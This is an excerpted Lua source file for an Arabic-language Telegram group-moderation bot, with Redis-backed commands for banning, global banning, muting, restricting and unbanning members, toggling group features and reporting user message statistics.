DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ انا لست ادمن في المجموعه *\n💥', 1, 'md') 
return false  end
if MARX:sismember(DEVSTOR..'DEVIL:baned'..msg.chat_id_,user) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تم الغاء حظره\n🍃'   
DEVILmonshn(msg.chat_id_, user, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:srem(DEVSTOR..'DEVIL:baned'..msg.chat_id_,user)   
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ انا لست ادمن في المجموعه *\n💥', 1, 'md') 
return false  end
if MARX:sismember(DEVSTOR..'DEVIL:baned'..msg.chat_id_,result.id_) then
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` ❫\n*🚸¦* تم الغاء حظره\n🍃'   
MARX:srem(DEVSTOR..'DEVIL:baned'..msg.chat_id_,result.id_)   
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md') 
else
...
for k, v in pairs(list) do 
local taha = MARX:get(DEVSTOR.."user:Name" .. v)
if taha then
local username = taha
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ انا لست ادمن في المجموعه *\n💥', 1, 'md') 
return false  end
if not MARX:sismember(DEVSTOR..'DEVIL:gbaned',result.sender_user_id_) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تـم حظره عام من الكروب\n🍃'   
DEVILmonshn(msg.chat_id_, result.sender_user_id_, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))   
MARX:sadd(DEVSTOR..'DEVIL:gbaned',result.sender_user_id_)   
else
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..result.sender_user_id_..'` ❫\n*🚸¦* تـم حظره عام من الكروب\n🍃'   
MARX:sadd(DEVSTOR..'DEVIL:gbaned',result.sender_user_id_)   
seavusername(result.sender_user_id_) 
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ انا لست ادمن في المجموعه *\n🍃', 1, 'md') 
return false  end
if not MARX:sismember(DEVSTOR..'DEVIL:gbaned',result.id_) then
zo = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` ❫\n*🚸¦* تـم حظره عام من الكروب\n🍃'   
MARX:sadd(DEVSTOR..'DEVIL:gbaned',result.id_)   
MARX:set(DEVSTOR.."user:Name"..result.id_,"@"..username)
else
zo = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` ❫\n*🚸¦* بالتاكيد تـم حظره عام من الكروب\n🍃'     
MARX:sadd(DEVSTOR..'DEVIL:gbaned',result.id_)   
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا استطيع استخراج معلوماته*\n💥', 1, 'md') 
return false  end
if not MARX:sismember(DEVSTOR..'DEVIL:gbaned',user) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تـم حظره عام من الكروب\n🍃'   
DEVILmonshn(msg.chat_id_, user, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:sadd(DEVSTOR..'DEVIL:gbaned',user)   
else
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..user..'` ❫\n*🚸¦* تـم حظره عام من الكروب\n🍃'   
MARX:sadd(DEVSTOR..'DEVIL:gbaned',user)   
seavusername(user) 
...
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تم الغاء حظره عام\n🍃'   
DEVILmonshn(msg.chat_id_, result.sender_user_id_, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:srem(DEVSTOR..'DEVIL:gbaned',result.sender_user_id_)   
else
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..result.sender_user_id_..'` ❫\n*🚸¦* تم الغاء حظره عام\n🍃'   
MARX:srem(DEVSTOR..'DEVIL:gbaned',result.sender_user_id_)   
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md') 
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ انا لست ادمن في المجموعه *\n💥', 1, 'md') 
return false  end
if MARX:sismember(DEVSTOR..'DEVIL:gbaned',user) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تم الغاء حظره عام\n🍃'   
DEVILmonshn(msg.chat_id_, user, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:srem(DEVSTOR..'DEVIL:gbaned',user)   
else
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..user..'` ❫\n*🚸¦* تم الغاء حظره عام\n🍃'   
MARX:srem(DEVSTOR..'DEVIL:gbaned',user)   
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md') 
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ انا لست ادمن في المجموعه *\n💥', 1, 'md') 
return false  end
if MARX:sismember(DEVSTOR..'DEVIL:gbaned',result.id_) then
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` ❫\n*🚸¦* تم الغاء حظره عام\n🍃'   
MARX:srem(DEVSTOR..'DEVIL:gbaned',result.id_)   
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md') 
else
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` ❫\n*🚸¦* بالتاكيد تم الغاء حظره عام\n🍃'   
MARX:srem(DEVSTOR..'DEVIL:gbaned',result.id_)   
...
if not MARX:sismember(DEVSTOR..'mutes'..msg.chat_id_,result.sender_user_id_) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تـم كتمه من الكروب\n🍃'   
DEVILmonshn(msg.chat_id_, result.sender_user_id_, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))   
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,result.sender_user_id_)   
else
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..result.sender_user_id_..'` ❫\n*📬¦* تـم كتمه من الكروب\n🍃'   
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,result.sender_user_id_)   
seavusername(result.sender_user_id_) 
...
return false  end 
if not MARX:sismember(DEVSTOR..'mutes'..msg.chat_id_,result.id_) then
zo = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` ❫\n*🚸¦* تـم كتمه من الكروب\n🍃'   
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,result.id_)   
MARX:set(DEVSTOR.."user:Name"..result.id_,"@"..username)
else
zo = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` ❫\n*🚸¦* بالتاكيد تـم كتمه من الكروب\n🍃'     
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,result.id_)   
...
return false  end
if not MARX:sismember(DEVSTOR..'mutes'..msg.chat_id_,user) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تـم كتمه من الكروب\n🍃'   
DEVILmonshn(msg.chat_id_, user, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,user)   
else
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..user..'` ❫\n*🚸¦* تـم كتمه من الكروب\n🍃'   
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,user)   
seavusername(user) 
...
if MARX:sismember(DEVSTOR..'mutes'..msg.chat_id_,result.sender_user_id_) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تم الغاء كتمه\n🍃'   
DEVILmonshn(msg.chat_id_, result.sender_user_id_, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:srem(DEVSTOR..'mutes'..msg.chat_id_,result.sender_user_id_)   
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا استطيع استخراج معلوماته*\n💥', 1, 'md') 
return false  end
if MARX:sismember(DEVSTOR..'mutes'..msg.chat_id_,user) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تم الغاء كتمه\n🍃'   
DEVILmonshn(msg.chat_id_, user, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:srem(DEVSTOR..'mutes'..msg.chat_id_,user)   
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا استطيع استخراج معلوماته*\n💥', 1, 'md') 
return false  end
if MARX:sismember(DEVSTOR..'mutes'..msg.chat_id_,result.id_) then
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` ❫\n*🚸¦* تم الغاء كتمه\n🍃'   
MARX:srem(DEVSTOR..'mutes'..msg.chat_id_,result.id_)   
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md') 
else
...
if not MARX:sismember(DEVSTOR..'tedmembars'..msg.chat_id_,result.sender_user_id_) then
if data.username_ == false then
...
MARX:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,result.sender_user_id_) 
else
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..result.sender_user_id_..'` ❫\n*🚸¦* تـم تقييده من الكروب\n🍃'   
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,result.sender_user_id_)   
seavusername(result.sender_user_id_) 
...
return false  end 
if not MARX:sismember(DEVSTOR..'tedmembars'..msg.chat_id_,result.id_) then
zo = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` ❫\n*🚸¦* تـم تقييده من الكروب\n🍃'   
HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.id_.."") 
MARX:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,result.id_) 
MARX:set(DEVSTOR.."user:Name"..result.id_,"@"..username)
else
zo = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` ❫\n*🚸¦* بالتاكيد تـم تقييده من الكروب\n🍃'     
HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.id_.."") 
...
return false  end
if not MARX:sismember(DEVSTOR..'tedmembars'..msg.chat_id_,user) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تـم تقييده من الكروب\n🍃'   
DEVILmonshn(msg.chat_id_, user, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..user.."") 
MARX:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,user) 
else
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..user..'` ❫\n*🚸¦* تـم تقييده من الكروب\n🍃'   
HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..user.."") 
MARX:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,user) 
...
if MARX:sismember(DEVSTOR..'tedmembars'..msg.chat_id_,result.sender_user_id_) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تم الغاء تقييده\n🍃'   
DEVILmonshn(msg.chat_id_, result.sender_user_id_, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا استطيع استخراج معلوماته*\n💥', 1, 'md') 
return false  end
if MARX:sismember(DEVSTOR..'tedmembars'..msg.chat_id_,user) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تم الغاء تقييده\n🍃'   
DEVILmonshn(msg.chat_id_, user, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا استطيع استخراج معلوماته*\n💥', 1, 'md') 
return false  end
if MARX:sismember(DEVSTOR..'tedmembars'..msg.chat_id_,result.id_) then
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` ❫\n*🚸¦* تم الغاء تقييده\n🍃'   
HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
MARX:srem(DEVSTOR..'tedmembars'..msg.chat_id_,result.id_) 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md') 
...
if text ==('مسح قائمه المنع') and is_mod(msg) then MARX:del(DEVSTOR..'filters:'..msg.chat_id_) DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'📇*¦* تم مسح قائمه المنع', 1, 'md') end 
if text == ('قائمه المنع') and is_mod(msg) then  
local list = MARX:smembers(DEVSTOR..'filters:'..msg.chat_id_) 
...
if MARX:sismember(DEVSTOR..'lock:pin',msg.chat_id_) and not is_monsh(msg) then
DEVIL_sendMsg(msg.chat_id_,msg.id_, 1, "*📮¦* التثبيت مقفل في المجموعه \n🍃", 1, 'md')  
return false  end
if MARX:sismember(DEVSTOR..'lockpinmsg:ban'..msg.chat_id_,msg.sender_user_id_) then
...
if text == 'اطردني' and not MARX:get(DEVSTOR.."lock:kickme"..msg.chat_id_)   then 
tdcli_function ({
ID = "GetChatMember",
chat_id_ = msg.chat_id_,
user_id_ = msg.sender_user_id_},
...
MARX:del(DEVSTOR..'kick:'..msg.chat_id_..':'..msg.sender_user_id_, true) 
return false  end 
if DEVIL1(msg.chat_id_,msg.sender_user_id_) then 
if tonumber(msg.sender_user_id_) == tonumber(SUDO) then
t = 'المطور'
elseif MARX:sismember(DEVSTOR..'sudo:bot',msg.sender_user_id_) then
t = 'المطور'
elseif MARX:sismember(DEVSTOR..'moder'..msg.chat_id_,msg.sender_user_id_) then
t = 'المنشئ'
elseif MARX:sismember(DEVSTOR..'modergroup'..msg.chat_id_,msg.sender_user_id_) then
t = 'المدير'
elseif MARX:sismember(DEVSTOR..'mods:'..msg.chat_id_,msg.sender_user_id_) then
t = 'الادمن'
elseif MARX:sismember(DEVSTOR..'vip:groups',msg.sender_user_id_) then
t = 'مميز عام'
elseif MARX:sismember(DEVSTOR..'vip:group'..msg.chat_id_,msg.sender_user_id_) then
t = 'مميز'
else
t = ' '
end
...
MARX:set(DEVSTOR..hash, "waite") 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '📮*¦* رائع الان يمكنك تطبيق الشروط\n⚀*¦* ارسل ❪ نعم ❫ ليتم طردك\n*⚁¦* ارسل ❪ لا ❫ لالغاء طردك\n💥', 1, 'md') 
end,nil)
end 
if text then 
local hash = 'kick:'..msg.chat_id_..':'..msg.sender_user_id_ 
if text:match("^نعم$") and MARX:get(DEVSTOR..hash) == "waite" then 
MARX:set(DEVSTOR..hash, "نعم") 
elseif text:match("^لا$") and MARX:get(DEVSTOR..hash) == "waite" then 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📬¦* حسنآ لن يتم طردك من هنا\n💭', 1, 'md') 
MARX:del(DEVSTOR..hash, true) 
end 
end 
local hash = 'kick:'..msg.chat_id_..':'..msg.sender_user_id_ 
if MARX:get(DEVSTOR..hash) then 
if MARX:get(DEVSTOR..hash) == "نعم" then 
if DEVIL1(msg.chat_id_,msg.sender_user_id_) then 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦* عذرا انت ❪ '..get_mok(msg.chat_id_,msg.sender_user_id_)..' ❫ لا استطيع طردك \n🍃', 1, 'md') 
else  
kick(msg,msg.chat_id_,msg.sender_user_id_)  
...
if text == 'نزلني' and not MARX:get(DEVSTOR.."lock:demrtpa"..msg.chat_id_)   then 
local hash = 'demrtpa:'..msg.chat_id_..':'..msg.sender_user_id_ MARX:set(DEVSTOR..hash, "waite") 
...
MARX:del(DEVSTOR..'demrtpa:'..msg.chat_id_..':'..msg.sender_user_id_, true)  
else  
...
if MARX:get(DEVSTOR..hash) then 
if MARX:get(DEVSTOR..hash) == "نعم" then 
MARX:srem(DEVSTOR..'modergroup'..msg.chat_id_,msg.sender_user_id_)  
MARX:srem(DEVSTOR..'mods:'..msg.chat_id_,msg.sender_user_id_) 
MARX:srem(DEVSTOR..'vip:group'..msg.chat_id_,msg.sender_user_id_) 
...
MARX:set(DEVSTOR..'add:mepr:'..msg.chat_id_,true) 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,"📮❯ تم تفعيل الاضافه اجباري", 1, 'md') 
end 
end
if text == "تعطيل الاضافه" and is_owner(msg) then 
MARX:del(DEVSTOR..'add:mepr:'..msg.chat_id_) 
MARX:del(DEVSTOR..'meaddwy:'..msg.chat_id_) 
MARX:del(DEVSTOR..'meaddtaha:'..msg.chat_id_) 
local taha = MARX:keys("addedtaha:*") 
for i=1,#taha do MARX:del(DEVSTOR..taha[i]) 
end 
...
MARX:set(DEVSTOR..'setadd:'..msg.chat_id_,numadded) 
...
local nummsg = tonumber(MARX:get(DEVSTOR..'groupmsg:'..msg.chat_id_..':')) 
local nummsgg = MARX:get(DEVSTOR..'groupmsg:'..msg.chat_id_..':') 
...
if text and text:match("^مشاهده منشور$") then MARX:set(DEVSTOR..'viewchannel'..msg.sender_user_id_,true) DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '♼*¦* حسننا ارسل التوجيه من القناة سارسل عدد المشاهدات', 1, 'md') end 
if text and text:match("^ضع رد تواصل$") and is_devtaha(msg) then   MARX:setex(DEVSTOR.."sudo:pv" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'📬*¦* ارسل لي النص الذي تريده ', 1, 'md') end 
if text and text:match("^ضع كليشه المطور$") and is_devtaha(msg) then MARX:setex(DEVSTOR.."sudo:dev" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'📬*¦* ارسل لي النص الذي تريده ', 1, 'md') end 
if text and text:match("^ضع كليشه ستارت$") and is_devtaha(msg) then MARX:setex(DEVSTOR.."start:msgofstart" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'📬*¦* ارسل لي النص الذي تريده ', 1, 'md') end 
if msg.content_.ID == 'MessageChatChangeTitle' then tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,data)  MARX:set(DEVSTOR..'group:name'..msg.chat_id_,data.title_) end,nil)  end
...
DEVIL_sendMsg(msg.chat_id_,msg.id_, 1, "*📬¦* تم وضع اسم للمجموعه \n", 1, 'md')  
MARX:set(DEVSTOR..'group:name'..result.chat_id_,result.content_.text_)
end
end,nil) 
end 
...
if MARX:get(DEVSTOR..'lock:rep:rd'..msg.chat_id_) then
taha = '*📮¦ تم تفعيل الردود بالرد *\n✓' 
DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") 
MARX:del(DEVSTOR..'lock:rep:rd'..msg.chat_id_)  
else
...
if not MARX:get(DEVSTOR..'lock:rep:rd'..msg.chat_id_) then
taha = '*📮¦ تم تعطيل الردود بالرد *\n✓' 
DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") 
MARX:set(DEVSTOR..'lock:rep:rd'..msg.chat_id_,true)   
else
...
if MARX:get(DEVSTOR..'lock:rep'..msg.chat_id_) then
taha = '*📮¦ تم تفعيل الردود *\n✓' 
DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") 
MARX:del(DEVSTOR..'lock:rep'..msg.chat_id_)  
else
...
if not MARX:get(DEVSTOR..'lock:rep'..msg.chat_id_) then
taha = '*📮¦ تم تعطيل الردود *\n✓' 
DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") 
MARX:set(DEVSTOR..'lock:rep'..msg.chat_id_,true)   
else
...
if MARX:get(DEVSTOR..'lock:id'..msg.chat_id_)  then
taha = '*📮¦ تم تفعيل الايدي *\n✓' 
DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") 
MARX:del(DEVSTOR..'lock:id'..msg.chat_id_) 
else
...
if not MARX:get(DEVSTOR..'lock:id'..msg.chat_id_)  then
taha = '*📮¦ تم تفعيل الايدي *\n✓' 
DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") 
MARX:set(DEVSTOR..'lock:id'..msg.chat_id_,true) 
else
taha = '*📮¦ بالتاكيد تم تفعيل الايدي  *\n✓' 
DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") 
end
...
if MARX:get(DEVSTOR..'lock:get:photo'..msg.chat_id_) then
taha = '*📮¦ تم تفعيل امر جلب الصور *\n✓' 
DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") 
MARX:del(DEVSTOR..'lock:get:photo'..msg.chat_id_) 
else
...
if not MARX:get(DEVSTOR..'lock:get:photo'..msg.chat_id_) then
taha = '*📮¦ تم تعطيل امر جلب الصور *\n✓' 
DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") 
MARX:set(DEVSTOR..'lock:get:photo'..msg.chat_id_,true) 
else
...
if MARX:get(DEVSTOR..'lock:kickme'..msg.chat_id_)  then
taha = '*📮¦ تم تفعيل امر اطردني *\n✓' 
DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") 
MARX:del(DEVSTOR..'lock:kickme'..msg.chat_id_) 
else
...
if not MARX:get(DEVSTOR..'lock:kickme'..msg.chat_id_)  then
taha = '*📮¦ تم تعطيل امر اطردني *\n✓' 
DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") 
MARX:set(DEVSTOR..'lock:kickme'..msg.chat_id_,true) 
else
...
if MARX:get(DEVSTOR..'lock:demrtpa'..msg.chat_id_) then
taha = '*📮¦ تم تفعيل امر نزلني *\n✓' 
DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") 
MARX:del(DEVSTOR..'lock:demrtpa'..msg.chat_id_) 
else
...
if not MARX:get(DEVSTOR..'lock:demrtpa'..msg.chat_id_) then
taha = '*📮¦ تم تعطيل امر نزلني *\n✓' 
DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") 
MARX:set(DEVSTOR..'lock:demrtpa'..msg.chat_id_,true) 
else
...
if MARX:get(DEVSTOR..'lock:bot:free'..bot_id) then
taha = '*📮¦ تم تفعيل البوت الخدمي *\n✓' 
DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") 
MARX:del(DEVSTOR..'lock:bot:free'..bot_id) 
else
...
DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") 
MARX:set(DEVSTOR..'lock:bot:free'..bot_id,true) 
else
...
if MARX:get(DEVSTOR..'lock:klsh:add'..bot_id) then
taha = '*📮¦ تم تفعيل كليشه الترحيب عند الاضافه*\n✓' 
DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") 
MARX:del(DEVSTOR..'lock:klsh:add'..bot_id) 
else
...
if not MARX:get(DEVSTOR..'lock:klsh:add'..bot_id) then
taha = '*📮¦ تم تعطيل كليشه الترحيب عند الاضافه*\n✓' 
DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") 
MARX:set(DEVSTOR..'lock:klsh:add'..bot_id,true) 
else
...
if MARX:get(DEVSTOR..'lock:botl'..bot_id) then
taha = '*📮¦ تم تفعيل البوت التواصل *\n✓' 
DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") 
MARX:del(DEVSTOR..'lock:botl'..bot_id) 
else
...
DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") 
MARX:set(DEVSTOR..'lock:botl'..bot_id,true) 
else
taha = '*📮¦ بالتاكيد تم تعطيل البوت التواصل  *\n✓' 
DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") 
end
end
if text and text:match("^صورتي (%d+)") and not MARX:get(DEVSTOR.."lock:get:photo"..msg.chat_id_)  then 
...
local dev = MARX:get(DEVSTOR.."dev") 
if dev then 
...
MARX:del(DEVSTOR.."pvstart") 
DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, '*📛¦*تم حذف رد التوصل', 1, "md") 
end 
if text == "حذف كليشه ستارت" and is_devtaha(msg) then  
MARX:del(DEVSTOR.."start:msgofstart1") 
DEVIL_sendMsg( msg.chat_id_, msg.id_, 1, '*📛¦*تم حذف كليشه ستارت', 1, "md") 
end 
if text == 'معلوماتي' or text=='موقعي' or text == 'اكشفني' then 
local msgtaha = 500 
local msggstaha = MARX:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..msg.sender_user_id_) or 0  
local nupmsgg =  tonumber((msggstaha / msgtaha) * 100)   
local msguser = tonumber(MARX:get(DEVSTOR..'msg:user:'..msg.chat_id_..':'..msg.sender_user_id_) or 1) 
local tahamsg = (MARX:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..msg.sender_user_id_) or 0)
if is_devtaha(msg) then 
t = 'مطور اساسي 🌟'  
...
local whatnumadded = (MARX:get(DEVSTOR..'setadd:'..msg.chat_id_) or 0) 
...
local getmsgs = MARX:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local taha = '\n*📨¦ عدد رسائلك » ❪ '..getmsgs..' ❫ رساله\n📮¦ تم مسح جميع رسائلك *\n🍃'  
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,taha, 1, 'md')  
MARX:del(DEVSTOR..'user:messages:'..msg.chat_id_..':'..msg.sender_user_id_) 
end
...
if text == "تفاعلي" then
local msguser = tonumber(MARX:get(DEVSTOR..'user:messages:'..msg.chat_id_..':'..msg.sender_user_id_) or 1) 
taha = '*📮¦ تفاعلك هنا » ❪ '..formsgg(msguser)..' ❫\n🍃*'
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,taha, 1, 'md') 
end
if text == "جهاتي" then
local addmempar = tonumber(MARX:get(DEVSTOR..'add:mempar'..msg.chat_id_..':'..msg.sender_user_id_) or 0) 
if addmempar == 0 then
...
MARX:setex(DEVSTOR.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
local tahaid= [[
*📮¦ اهلا عزيزي المطور 
...
MARX:del(DEVSTOR.."KLISH:ID")
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,  '*📮¦ تم مسح كليشه الايدي *\n', 1, 'md')
return false  
end 
if MARX:get(DEVSTOR.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الامر *\n✓", 1, "md") 
MARX:del(DEVSTOR.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_) 
return false  end 
MARX:del(DEVSTOR.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_) 
...
MARX:set(DEVSTOR.."KLISH:ID",CHENGER_ID)
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'\n📬*¦* تم تغير كليشه الايدي \n', 1, 'md')    
end
if text == ("ايدي") and msg.reply_to_message_id_ == 0 and not MARX:get(DEVSTOR..'lock:id'..msg.chat_id_) then      
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
...
NUMPGAME = (MARX:get(DEVSTOR..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_) or 0)
if tonumber(NUMPGAME) == 0 then
nko = '0'
else
nko = NUMPGAME
end
local get_id_text = MARX:get(DEVSTOR.."KLISH:ID")
if get_id_text then
...
